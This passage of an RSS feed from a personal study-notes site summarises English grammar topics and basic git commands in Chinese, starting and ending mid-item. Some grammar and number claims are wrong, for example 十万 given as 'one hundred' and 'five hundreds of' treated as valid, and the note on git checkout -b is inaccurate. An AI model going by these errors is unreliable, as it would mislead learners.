      <description>宾语 指动作（谓语）的承受者。
能作主语的词都可以作宾语，不能作主语的，也不能作宾语。但要注意的是，如果是人称代词作宾语，则必须用宾格，不能用主格。
 I buy a book every year. You believe us I want two apples.  和表语不同，宾语前面不需要也不能有系动词 be.
间宾 一般来说， 我们把表示人的称为间接宾语。
间宾和直宾的位置是可以换的，如果间宾放直宾的后面，那么要在间宾的前面＋ to.
 Rainy teaches you English I gave a book to her I gave them books  直宾 我们把表示物的称为直接宾语。
 Rainy teaches you English  与宾补的区别 主语 + 及物动词 + 宾语 + 名词（作宾语）
主语 + 及物动词 + 宾语 + 名词（作宾补）
  I gave her a book.</description>
    </item>
    
    <item>
      <title>English 形容词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%BD%A2%E5%AE%B9%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%BD%A2%E5%AE%B9%E8%AF%8D/</guid>
      <description>形容词 用于修饰名词的词，简称 adj.
普通形容词 单独一个单词的形容词。
当形容词作定语的时候，前面必须加一个冠词 。
 She is a beautifu girl. he has a big house. He was angry now. I am very sad right now. I am smart person.  复合形容词 指的是由两个单词构成的一个新的形容词，两个单词之间有一个符号“-”
 sky-blue good-looking man-made second-hand  形容词的先后顺序 当出现几个形容词同时修饰名词作前置定语的时候，这时候我们就要考虑这些形容词在一句话中的先后顺序。
 冠词（a、an、the ）、物主代词（my）、数词（three）、指示代词等 描绘性的形容词 beautiful 表示形状、大小、长短、高矮。 表示年龄或者新旧。 表示颜色。 表示出处、来源。 表示材料，物质 表示用途  但一般情况下，同时修饰一个名词的形容词数量不会超过 4 个，多了就不是特别好了。、
形容词的比较级和最高级 大部分的形容词都有三个格式：原级、比较级、最高级。比较级就是相当于中文里面”更”的意思，最高级就相当于“最”的意思。
比如：漂亮的是一个形容词，更漂亮是一个比较级，最漂亮是一个最高级。
一个形容词的比较级和最高级的用法和原级是一样的，都可以作定语、表语和宾补。
A 超过 B A + be + 形容词比较级 + than + B.</description>
    </item>
    
    <item>
      <title>English 形容词从句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%BD%A2%E5%AE%B9%E8%AF%8D%E4%BB%8E%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%BD%A2%E5%AE%B9%E8%AF%8D%E4%BB%8E%E5%8F%A5/</guid>
      <description>形容词从句 将简单句修改，使它成为另一个句子的定语。也叫定语从句或关系从句。
定语从句都是后置的。
从句由先行词 + 关系词，组成，关系词可以分为关系代词和关系副词。
 a carrot that I bought.  关系词 先行词 + 关系代词
先行词是唯一的，用 that.
 The rebbit ate the largest carrot that I&amp;rsquo;ve ever seen. The only rebbit that ate a carrot  先行词多选一，用 which.
 The rebbit ate a carrot which I bought.  关系副词 关系副词相当于介词+关系副词
where、why 、when
限定性形容词性从句 The rabbit ate the carrot which was on the table.
其中 **which was on the table **限定了 carrot 的范围，which 相当于 the carrot</description>
    </item>
    
    <item>
      <title>English 感叹词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%84%9F%E5%8F%B9%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%84%9F%E5%8F%B9%E8%AF%8D/</guid>
      <description>感叹词 用于表示感叹或发出某种情感，通常处于句子的最前面或最后面，一般与句子本身没有实际的直接联系，简称 int.
比如 What、yum、blah 等都是叹词。
在 Ah，the apple is tasty 中，Ah 是叹词。</description>
    </item>
    
    <item>
      <title>English 数词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%95%B0%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%95%B0%E8%AF%8D/</guid>
      <description>数词 用于表示数量、数字、第几的词.
例句  The first is important. Eight is a number  基数词 表示数量的数词，比如一、二、三。
100 ~ 999 一 = one
十 = ten
百 = hundred
千 = thousand
万 = ten thousand
十万 = one hundred
百万 = one million
一亿 = one hundred million
十亿 = one billion
百亿 = ten billion
千亿 = myriads
特点 作数词时候，前面可以加数词，后面不能加 s，two thousand，three thousands（错）
如果数词用作名词时候，意思是好几…的时候，前面可以加 some、many、several 这种词或者加数词，后面可以加 of
hundreds of（好几百）
five hundreds of（五百左右）</description>
    </item>
    
    <item>
      <title>English 特殊疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E7%89%B9%E6%AE%8A%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E7%89%B9%E6%AE%8A%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>特殊疑问句 不可以用 yes、no 回答的疑问句。
特殊疑问句是对句子中的某个句子成分提问，用特殊疑问词开头，下面列举一些特殊疑问词。
特殊疑问词 Who 提问人，是谁？
 Who’s next? Who is the richet? Who is in my room?  Whose 提问所属，谁的？。
 Whose car is this? Whose money do you spend? Whose car will Jeff drive after class?  Whom 提问宾格人 Who 的宾格。
 Whom did you choose for our them leader?     Whom do you love?      What 提问事情属性，是什么？
 What time is it?</description>
    </item>
    
    <item>
      <title>English 状语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E7%8A%B6%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E7%8A%B6%E8%AF%AD/</guid>
      <description>状语 用于修饰谓语动词，它只跟谓语有关系。
xxx 的执行某个动作，xxx 就是状语。
 The rabbit ate quickly I teach English in Beijing I am happy in Guizhou I am happy today I am busy now I will buy a book tomorrow I speak English slowly  一句话里面可以使用多个状语，但有的时候可能逻辑不对。
 I always eat bread every day.  这个句子语法没问题，但是逻辑有矛盾，因为“总是吃”不代表“每天吃”，两者的频率是不同的“每天吃”的频率比“总是吃”要高很多。
如果改成下面这个句子就对了：
 I always eat bread in the morning.  把 every day 换成 in the morning，就不会和 always 逻辑冲突了。</description>
    </item>
    
    <item>
      <title>English 简单句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%AE%80%E5%8D%95%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%AE%80%E5%8D%95%E5%8F%A5/</guid>
      <description>简单句 陈述句 肯定式 i have money
肯定式边否定式，助动词（do）后面，加否定词（not）
否定式 i don’t have money
疑问句 感叹句 祈使句 </description>
    </item>
    
    <item>
      <title>English 表语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%A1%A8%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%A1%A8%E8%AF%AD/</guid>
      <description>表语 说明主语怎么怎么样，是谓语的一部分。
表语和系动词 be 不能分开使用，没有系动词就没有表语，没有表语就没有系动词，因此，系动词后面的词大部分都是表语。
  I am rich
  You are my friend
  We are in the classroom
  </description>
    </item>
    
    <item>
      <title>English 语气词 &#43; 感叹号</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/%E8%AF%AD%E6%B0%94%E8%AF%8D-&#43;-%E6%84%9F%E5%8F%B9%E5%8F%B7/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/%E8%AF%AD%E6%B0%94%E8%AF%8D-&#43;-%E6%84%9F%E5%8F%B9%E5%8F%B7/</guid>
      <description>语气词 + 感叹号 Wow! That’s totally awesome!
哇！真是厉害！
Oh! You’re Peter！
哇！你是皮特！</description>
    </item>
    
    <item>
      <title>English 请求、祝愿</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E8%AF%B7%E6%B1%82%E7%A5%9D%E6%84%BF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E8%AF%B7%E6%B1%82%E7%A5%9D%E6%84%BF/</guid>
      <description>请求、祝愿 Have a good day（祝你有美好的一天）
Let me help you（让我帮你）</description>
    </item>
    
    <item>
      <title>English 谓语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%B0%93%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%B0%93%E8%AF%AD/</guid>
      <description>谓语 一般在主语之后，用于说明主语的动作、状态、特征和行为。
动作型谓语 用于说明主语做什么。
一般由谓语动词构成。
例句  I eat an apple everyday  简单谓语 由实义动词或复合动词构成。
例句  I wrok every day. I run every run. I love you. She looks after her brother. I git up at six  复合谓语 由简单谓语 + 其他词语，共同作谓语的情况。
情态动词 + 实义动词/复合动词的原形  I can speak Cantonese I can look after her  助动词 ＋ 实义动词/复合动词的原形  I will buy a new book tomorrow. I will get up early tomorrow.</description>
    </item>
    
    <item>
      <title>English 连词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E8%BF%9E%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E8%BF%9E%E8%AF%8D/</guid>
      <description>连词 用来连接词与词、词组与词组、句子与句子，使得形成某种逻辑关系或语法结构的词。简称 conj.
连词可以表并列、承接、转折、因果、选择、假设、比较、让步等关系。
1、并列连词
and 和，那么，渐渐
or 或，否则，不管是…，还是
but 但是，而是，的确…但
nor 也不
so 也是，因此，所以，那么，这样看来
for 因为（表示推测），由于
2、相关连词
both A and B 既是 A 又是 B
either A or B 不是 A 就是 B
neither A nor B 既不是 A 也不是 B，两者皆非
not only A but also B 不但 A 而且 B
A as well as B 不但 A 而且 B ,与，和
3、准连词
而且 besides, furthermore, moreover, in addition
然而 yet, still, however, nevertheless</description>
    </item>
    
    <item>
      <title>English 选择疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E9%80%89%E6%8B%A9%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E9%80%89%E6%8B%A9%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>选择疑问句 不可以用 yes，no 回答
选择疑问句用 or 连接，一般是提问两个以上的句子内容，我们选择其中一个进行回答。
选择疑问句：Do you like to play football or basketball?（你喜欢踢球还是打篮球？）
回答：I like to play football./I like to play basketball.</description>
    </item>
    
    <item>
      <title>Git git add</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-add/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-add/</guid>
      <description>git add 将我们需要提交的代码从工作区添加到暂存区，也就是告诉 git ，我们要提交哪些文件。之后就可以使用git commit命令进行提交了。
git add . 添加当前目录所有的文件，. 表示当前目录的所有文件夹。
git add FileName 添加文件名为 FileNmae 的文件，FileNmae 代表需要被添加的文件的名字，比如 git add ReadMe.txt，即表示添加这个 ReadMe.txt 文件，
添加多个文件时，文件名使用空格分开即可 git add FileName1 FileName2 FileName3 多次 git add git add FileName1 git add FileName2 git add FileName3 git add -f git add .不会添加被**.gitignore忽略的文件，而git add -f . 强制添加所有文件，即使是被.gitignore**忽略的文件也添加。</description>
    </item>
    
    <item>
      <title>Git git add</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-branch/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-branch/</guid>
      <description>git branch 一般用于对分支的操作，比如创建分支，查看分支等等，
git branch 不带参数：列出本地已经存在的分支，并且在当前分支的前面用*****标记
一个新的本地仓库，必须在git add且git commit之后，再使用git branch命令，才能显示出本地分支master。
git branch BranchName 创建名为BranchName的分支，创建分支时需要是最新（当前分支的代码已经git commit）的环境，并且创建分支后依然停留在当前分支。
git branch -d BranchName 删除名为BranchName的分支，如果在分支中有一些未merge的提交，那么会删除分支失败，此时可以使用git branch -D BranchName强制删除名为BranchName的分支
git branch &amp;ndash;set-upstream-to=origin/dev LocalDev 将名为LocalDev的本地分支与名为origin/dev的远程分支相关联。</description>
    </item>
    
    <item>
      <title>Git git checkout</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-checkout/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-checkout/</guid>
      <description>git checkout $ git checkout &amp;ndash;File 清空名为File文件的修改，注意不要忘记中间的 &amp;ndash;，，如果不加 &amp;ndash;，就变成了切换到 FileName 分支的命令。
$ git checkout -- ReadMe.txt git checkout . 清空在工作区中，对文件所作的所有修改，**.**表示当前目录的所有文件夹。
git checkout Branch to track remote branch &amp;#39;BranchName&amp;#39; from &amp;#39;origin&amp;#39;. 将当前分支切换到名为BranchName的分支
git checkout -b BranchName -b 参数相当于以下两条命令
git branch BranchName git checkout BranchName git checkout -b LocalBranch origin/RemoteBranch 在本地创建一个名为LocalBranch的分支，并创建一个名为RemoteBranch的远程分支。
这个远程分支和本地分支相对应，另外，本地和远程分支的名称最好一致。</description>
    </item>
    
    <item>
      <title>Git git cherry-pick</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-cherry-pick/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-cherry-pick/</guid>
      <description>git cherry-pick 对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。
这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 Cherry pick。
git cherry-pick commitHash 将指定的commitHash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。</description>
    </item>
    
    <item>
      <title>Git git clone</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-clone/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-clone/</guid>
      <description>git clone 拷贝一个远程库到本地，让自己能够查看该项目，或者进行修改。
git clone RemoteAddress 克一个RemoteAddress到本地。</description>
    </item>
    
    <item>
      <title>Git git commit</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-commit/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-commit/</guid>
      <description>git commit 将暂存区中的内容添加到本地仓库，相当于确认提交暂存区中的内容。
每次使用git commit命令我们都会在本地版本库生成一个 40 位的哈希值，这个哈希值也叫 commit-id， commit-id 在版本回退的时候是非常有用的，它相当于一个快照，可以在未来的任何时候通过与git reset的组合命令回到这里.
git commit -m ‘message’ -m 参数表示可以直接输入后面的 “message”，如果不加 -m 参数，那么是不能直接输入 message 的，而是会调用一个编辑器一般是 vim 来让你输入这个 message。message 即是我们用来简要说明这次提交的语句，比如对文件进行了哪些修改、谁进行的修改等等。
常见错误 用 git 提交的时候，报错:
pathspec &amp;#39;commit&amp;#39;&amp;#39; did not match any file(s) known to git 后来发现用单引号提交报错，改成双引号就成功了
git commit -m &amp;#34;first commit&amp;#34; </description>
    </item>
    
    <item>
      <title>Git git config alias</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-alias/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-alias/</guid>
      <description>git config alias git config alias.ShorthandName OriginalName 将git OriginalName命令修改（通常为简写）为git ShorthandName，且只对当前 Git 仓库有效，配置文件在当前仓库的**.git/config**中。
git config &amp;ndash;global alias.ShorthandName OriginalName 加上--global参数可以对当前用户下的所有仓库起作用，配置文件在 C 盘用户目录下的一个**.gitconfig**文件中。</description>
    </item>
    
    <item>
      <title>Git git config user</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-user/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-user/</guid>
      <description>git config user git config user.name &amp;ldquo;UserName&amp;rdquo; git config user.email &amp;ldquo;Email&amp;rdquo; 对当前仓库设置名为UserName的用户名和名为Email的邮箱。
git config &amp;ndash;global user.name &amp;ldquo;UserName&amp;rdquo; git config &amp;ndash;global user.email &amp;ldquo;Email&amp;rdquo; git config命令的–global参数，表示你这台机器上所有的 Git 仓库都会使用这个配置，当然也可以对不同的仓库指定不同的用户名和 Email 地址。</description>
    </item>
    
    <item>
      <title>Git git diff</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-diff/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-diff/</guid>
      <description>git diff git diff 比较暂存区与工作区中文件之间的差异，可以让我们知道这些文件具体修改了些什么。</description>
    </item>
    
    <item>
      <title>Git git log</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-log/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-log/</guid>
      <description>git log 可以让我们查看从最近到最远所有的历史提交日志，每条日志中有对应的版本号，这个版本号可以让我们回退到指定版本号的那个版本。
git log &amp;ndash;pretty=oneline 每条日志都只显示一行 多屏显示控制方式空格向下翻页 b 向上翻页 q 退出
git log &amp;ndash;graph 用于查看分支的合并图，也叫做点线图。</description>
    </item>
    
    <item>
      <title>Git git merge</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-merge/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-merge/</guid>
      <description>git merge 用于合并指定分支到当前分支
git merge BranchName 将名为 BranchName 的分支合并到当前分支。
git merge &amp;ndash;no-ff -m &amp;ldquo;merge with no-ff&amp;rdquo; BranchName 合并名为 BranchName 的分支到当前分支，并创建一个新的 commit，所以加上-m参数，将 commit 的描述写进去。</description>
    </item>
    
    <item>
      <title>Git git pull</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-pull/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-pull/</guid>
      <description>git pull 用于从远程获取代码并合并本地。
git pull origin master:dev 将远程仓库origin的master分支拉取过来，与本地的dev分支合并。
git pull origin master 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。
将远程仓库 master 分支中的内容同步到本地仓库 master 分支中</description>
    </item>
    
    <item>
      <title>Git git push</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-push/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-push/</guid>
      <description>git push 在使用git commit命令将你进行的修改从暂存区提交到本地版本库后，只剩下最后一步将本地版本库的分支推送到远程服务器上对应的分支了。
git push的一般形式为git push &amp;lt;远程主机名&amp;gt; &amp;lt;本地分支名&amp;gt; &amp;lt;远程分支名&amp;gt;，例如git push origin master：refs/for/master，即是将本地的 master 分支推送到远程主机 origin 上的 master 分支， origin 是远程主机名。第一个 master 是本地分支名，第二个 master 是远程分支名，分支名是可以修改的。
git push origin master 将本地master分支内容推送到远程库origin的master分支上，这里的master表示是远程服务器上的master分支和本地分支重名后的简写。
git push -u origin master. -u 表示 Git 不但会将本地 master 分支内容推送到远程库 origin 的 master 分支上，还会把本地的master分支和远程的master分支关联起来，在以后推送内容时就可以直接使用git push命令了，即可以省略origin master。
git push origin ：refs/for/master 如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支，等同于git push origin –delete master
git push origin TagName 推送名为TagName的标签到远程库。
git push origin :refs/tags/TagName 删除名为TagName的远程标签。
git push origin &amp;ndash;tags 推送全部未推送到远程库的本地标签。</description>
    </item>
    
    <item>
      <title>Git git rebase</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-rebase/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-rebase/</guid>
      <description>git rebase 用于把一个分支的所有修改（commit）合并到当前分支。
rebase 操作可以把本地未 push 的分叉提交历史整理成直线；
git rebase BranchName git rebase会把当前分支master的每个 commit 丢弃掉，并且把它们临时保存为patch(这些patch放到**.git/rebase目录中)，然后将BranchName分支上的commit更新到master分支上，最后把保存的这些补丁应用到更新后的master**分支上。
当master分支更新之后，它会指向原来BranchName分支上的commit，而那些原本在自己身上的commit已经被丢弃了。如果运行垃圾收集命令, 这些被丢弃的提交就会删除。
因为原本在master分支上的 commit 被丢弃了，因此，这时候的分支就变为了一条直线，
与 git merge 的区别 当我们使用Git log来参看commit时，其commit的顺序也有所不同。</description>
    </item>
    
    <item>
      <title>Git git reflog</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reflog/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reflog/</guid>
      <description>git reflog 可以查看所有分支的所有操作记录（包括已经被删除的git commit记录和git reset的操作）</description>
    </item>
    
    <item>
      <title>Git git remote</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-remote/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-remote/</guid>
      <description>git remote git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git 将一个已有的本地仓库与远程库相关联。
git remote -v 查看远程库信息</description>
    </item>
    
    <item>
      <title>Git git reset</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reset/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reset/</guid>
      <description>git reset 用于回退版本。
git reset &amp;ndash;hard VersionNumber 可以指定回退到某一次提交后的版本号上，VersionNumber 为commit id
git reset HEAD FileNmae 将 FileName 在暂存区的修改回退到工作区，即把 FileNmae 在暂存区中删除。这里的 HEAD 表示 FileNmae 最新的版本。
git reset &amp;ndash;hard HEAD^ 在 Git 中，用HEAD表示当前版本，上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上 100 个版本写 100 个**^比较不方便，所以我们写成HEAD~100**。</description>
    </item>
    
    <item>
      <title>Git git show</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-show/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-show/</guid>
      <description>git show 查看最新的 commit 提交。
git show TagName 查看标签名为TagName的 commit 提交。</description>
    </item>
    
    <item>
      <title>Git git stash</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-stash/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-stash/</guid>
      <description>git stash 将当前工作区的文件先暂存起来，等 bug 修改完成后，再将暂存的工作区文件内容拿出来继续工作。
git stash apply 恢复后，stash内容并不删除，你需要用git stash drop来删除；
git stash pop 恢复的同时把stash内容也删了。
git stash list 查看将前被暂存的工作区。</description>
    </item>
    
    <item>
      <title>Git git switch</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-switch/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-switch/</guid>
      <description>git switch 用于切换分支。与git checkout命令的区别在于，使用新的git switch命令，比git checkout要更容易理解。
git switch -c Dev 创建并切换到新的Dev分支。
git switch Dev 直接切换到名为Dev的分支。</description>
    </item>
    
    <item>
      <title>Git git tag</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-tag/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-tag/</guid>
